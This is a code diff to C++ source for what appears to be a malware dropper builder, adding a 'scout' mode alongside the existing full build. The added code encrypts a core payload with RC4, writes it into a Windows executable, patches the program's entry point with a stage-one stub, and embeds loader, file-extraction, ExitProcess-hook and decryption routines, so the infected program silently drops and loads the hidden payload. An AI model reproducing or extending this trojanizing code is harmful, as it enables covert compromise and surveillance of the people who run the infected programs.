@@ -8,6 +8,7 @@ namespace bf = boost::filesystem;
 
 #include "PEObject.h"
 #include "DropperObject.h"
+#include "DropperCodeScout.h"
 #include "XRefNames.h"
 #include "rc4.h"
 
@@ -39,6 +40,99 @@ DropperObject::DropperObject(PEObject& pe)
 	}
 
 	_exeType = _pe.exeType;
+}
+
+DWORD DropperObject::_build_scout( WINSTARTFUNC OriginalEntryPoint, std::string fPrefix )
+{
+	DWORD dataBufferSize = 0;
+
+	unsigned int buffer_size = 65535
+		+ _files.core.size;
+
+	_data.reset( new char[buffer_size] );
+	char * ptr = _data.get();
+
+	DataSectionHeader* header = (DataSectionHeader*)ptr;
+	memset(header, 0, sizeof(DataSectionHeader));
+	ptr += sizeof(DataSectionHeader);
+	
+	header->exeType = _pe.exeType;
+
+	// Generate ecryption key
+	string rc4_key;
+	generate_key(rc4_key, sizeof(header->rc4key));
+	memcpy(header->rc4key, rc4_key.c_str(), sizeof(header->rc4key));
+	//generate_key(rc4_key, 32);
+	//memcpy(header->rc4key, rc4_key.c_str(), 32);
+
+	cout << "Key       : " << rc4_key << endl;
+	cout << "Key length: " << dec << sizeof(header->rc4key) << endl;	
+	
+	// Original EP
+	header->pfn_OriginalEntryPoint = OriginalEntryPoint;
+
+	// copy patched code for stage1 stub
+	memcpy(ptr, _patches[0].buffer.get(), _patches[0].size);
+	header->stage1.offset = ptr - _data.get();
+	header->stage1.VA = _patches[0].VA;
+	header->stage1.size = _patches[0].size;
+	ptr += _patches[0].size;
+
+
+	ptr = _embedFile(header->rc4key, _files.core, header->files.names.core, header->files.core, ptr);
+
+	// compute total data section size and store in buffer
+	dataBufferSize = ptr - _data.get();
+	memcpy(ptr, &dataBufferSize, sizeof(dataBufferSize));
+	ptr += sizeof(dataBufferSize);	
+	END_MARKER(ptr);
+
+
+	// find new EP and copy dropper code in it
+	_epOffset = ptr - _data.get();
+	ptr += _embedFunction((PVOID)DropperScoutEntryPoint, (PVOID)DropperScoutEntryPoint_End, header->functions.newEntryPoint, ptr);
+	cout << "NewEntryPoint is " << header->functions.newEntryPoint.size << " bytes long, offset " << header->functions.newEntryPoint.offset << endl;
+
+
+	// ExitProcessHook data
+	*((DWORD*) ptr) = ptr - _data.get();
+	ptr += sizeof(DWORD);
+	END_MARKER(ptr);
+
+	// DumpFile code
+	ptr += _embedFunction((PVOID)ExtractFile, (PVOID)ExtractFile_End, header->functions.dumpFile, ptr);
+	cout << "DumpFile is " << header->functions.dumpFile.size << " bytes long, offset " << header->functions.dumpFile.offset << endl;
+	
+	// ExitProcessHook code
+	ptr += _embedFunction((PVOID)ExitProcessHook_scout, (PVOID)ExitProcessHook_scout_End, header->functions.exitProcessHook, ptr);
+	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
+
+	// RC4 code
+	ptr += _embedFunction((PVOID)scout_arc4, (PVOID)scout_arc4_End, header->functions.rc4, ptr);
+	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
+
+	// _loadlirary
+	ptr += _embedFunction((PVOID)_LoadLibrary, (PVOID)_LoadLibrary_End, header->functions.load, ptr);
+	cout << "_Load is " << header->functions.load.size << " bytes long, offset " << (DWORD)header->functions.load.offset << endl;
+
+	// WaitForThread
+	//ptr += _embedFunction((PVOID)WaitForThread, (PVOID)WaitForThread_End, header->functions.hookCall, ptr);
+	//cout << "_WaitForThread is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;
+
+
+	header->restore.offset = ptr - _data.get();
+	// static size of restoreStub
+	header->restore.size = 54;  
+	ptr += 54;
+
+	// compute total size
+	_size = alignToDWORD(ptr - _data.get());
+	
+	cout << "Total dropper size is " << _size << " bytes." << endl;
+	
+	// return offset to new EP
+	return _epOffset;
+
 }
 
 DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefix )
@@ -307,6 +401,7 @@ char* DropperObject::_embedFile(char* rc4key, NamedFileBuffer& source, DataSecti
 	ptr += name.size;
 	
 #if defined PACK_DATA
+	printf("[*] Compressing data, file size: %d\n", source.size);
 	file.characteristics |= APLIB_PACKED;
 	int length = source.size;
 	
@@ -337,6 +432,7 @@ char* DropperObject::_embedFile(char* rc4key, NamedFileBuffer& source, DataSecti
 
 	// crypt and write file
 	file.characteristics |= RC4_CRYPTED;
+
 	rc4crypt((unsigned char*)rc4key, RC4KEYLEN, (unsigned char*)packed, packed_size);
 	memcpy(ptr, packed, packed_size);
 	ptr += packed_size;
@@ -369,37 +465,57 @@ bool DropperObject::_readFile( std::string path, NamedFileBuffer& buffer )
 	return true;
 }
 
-bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix, bf::path demoBitmap )
+bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, std::string fPrefix, bf::path demoBitmap, BOOL isScout )
 {
-	try {
-		_setExecutableName("XXX");
-		_setInstallDir(installDir);
-		
-		_addCoreFile(core.string(), core.filename());
-		_addConfigFile(config.string(), config.filename());
-		
-		if (!core64.empty())
-			_addCore64File(core64.string(), core64.filename());
 
-		if (!codec.empty())
-			_addCodecFile(codec.string(), codec.filename());
-		
-		if (!driver.empty())
-			_addDriverFile(driver.string(), driver.filename());
+	if (isScout)
+	{
+		try
+		{
+			_setExecutableName("XXX");
+			_setInstallDir("123");
 
-		if (!driver64.empty())
-			_addDriver64File(driver64.string(), driver64.filename());
+			_addCoreFile(core.string(), core.filename());
 
-		if (!demoBitmap.empty())
-			_addBitmapFile(demoBitmap.string(), demoBitmap.filename());
-		
-		_build( (WINSTARTFUNC) _pe.epVA(), fPrefix );
-		
-	} catch (...) {
-		cout << __FUNCTION__ << "Failed building dropper object." << endl;
-		return false;
+			_build_scout( (WINSTARTFUNC) _pe.epVA(), fPrefix );
+		}
+		catch (...)
+		{
+			cout << __FUNCTION__ << "Failed building dropper object for SCOUT." << endl;
+			return false;
+		}
 	}
-	
+	else
+	{
+		try {
+			_setExecutableName("XXX");
+			_setInstallDir(installDir);
+
+			_addCoreFile(core.string(), core.filename());
+			_addConfigFile(config.string(), config.filename());
+
+			if (!core64.empty())
+				_addCore64File(core64.string(), core64.filename());
+
+			if (!codec.empty())
+				_addCodecFile(codec.string(), codec.filename());
+
+			if (!driver.empty())
+				_addDriverFile(driver.string(), driver.filename());
+
+			if (!driver64.empty())
+				_addDriver64File(driver64.string(), driver64.filename());
+
+			if (!demoBitmap.empty())
+				_addBitmapFile(demoBitmap.string(), demoBitmap.filename());
+
+			_build( (WINSTARTFUNC) _pe.epVA(), fPrefix );
+
+		} catch (...) {
+			cout << __FUNCTION__ << "Failed building dropper object." << endl;
+			return false;
+		}
+	}
 	return true;
 }
 
